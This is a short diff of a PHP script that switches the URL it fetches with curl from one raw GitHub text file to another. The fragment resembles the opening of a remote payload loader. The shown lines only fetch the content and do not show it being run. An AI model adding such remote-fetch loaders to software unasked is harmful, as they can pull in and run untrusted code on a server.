@@ -1,5 +1,5 @@
 <?php
-$url = 'https://raw.githubusercontent.com/Xmet/bebass/main/file.txt';
+$url = 'https://raw.githubusercontent.com/qashour/sabeb/main/file.txt.txt';
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
